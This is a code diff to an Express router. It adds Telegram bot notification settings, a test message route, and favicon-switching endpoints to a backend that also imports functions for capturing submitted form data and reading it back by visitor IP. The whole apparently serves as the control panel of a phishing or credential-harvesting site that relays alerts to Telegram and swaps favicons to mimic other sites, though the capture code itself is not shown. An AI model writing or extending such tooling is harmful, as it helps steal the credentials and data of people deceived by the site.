@@ -1,6 +1,7 @@
 import { Router, type IRouter, type Request, type Response } from "express";
 import healthRouter from "./health";
-import { globalProvider, getSiteActive, setSiteActive, captureFormDataHTTP, readCapturesByIp, deleteCapturesByIp } from "../ws.js";
+import { globalProvider, getSiteActive, setSiteActive, getFaviconChoice, setFaviconChoice, captureFormDataHTTP, readCapturesByIp, deleteCapturesByIp } from "../ws.js";
+import { getTelegramStatus, saveTelegramConfig, sendTelegramMessage } from "../lib/telegram.js";
 
 const router: IRouter = Router();
 
@@ -14,8 +15,48 @@ router.get('/admin-config', (_req: Request, res: Response) => {
   return res.json({ passcodeRequired: !!process.env['ADMIN_PASSCODE'] });
 });
 
+function isAuthorizedAdmin(req: Request): boolean {
+  const required = process.env['ADMIN_PASSCODE'];
+  return !required || req.header('x-admin-passcode') === required;
+}
+
+router.get('/telegram-setting', (req: Request, res: Response) => {
+  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
+  return res.json(getTelegramStatus());
+});
+
+router.post('/telegram-setting', (req: Request, res: Response) => {
+  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
+  const { botToken, chatId, enabled } = req.body as { botToken?: string; chatId?: string; enabled?: boolean };
+  if (typeof chatId !== 'string' || typeof enabled !== 'boolean') {
+    return res.status(400).json({ error: 'chatId and enabled are required' });
+  }
+  if (!botToken?.trim() && !getTelegramStatus().configured) {
+    return res.status(400).json({ error: 'Bot token is required' });
+  }
+  return res.json(saveTelegramConfig({ botToken, chatId, enabled }));
+});
+
+router.post('/telegram-setting/test', async (req: Request, res: Response) => {
+  if (!isAuthorizedAdmin(req)) return res.status(401).json({ error: 'Unauthorized' });
+  const sent = await sendTelegramMessage('Ping — Telegram notifications are working.', true);
+  return sent ? res.json({ ok: true }) : res.status(502).json({ error: 'Telegram rejected the message. Check the token and chat ID.' });
+});
+
 router.get('/site-status', (_req: Request, res: Response) => {
   return res.json({ active: getSiteActive() });
+});
+
+router.get('/favicon-setting', (_req: Request, res: Response) => {
+  return res.json({ favicon: getFaviconChoice() });
+});
+
+router.post('/favicon-setting', (req: Request, res: Response) => {
+  const { favicon } = req.body as { favicon?: string };
+  if (typeof favicon !== 'string') return res.status(400).json({ error: 'favicon is required' });
+  const saved = setFaviconChoice(favicon);
+  if (!saved) return res.status(400).json({ error: 'invalid favicon choice' });
+  return res.json({ favicon: saved });
 });
 
 router.post('/site-status', (req: Request, res: Response) => {
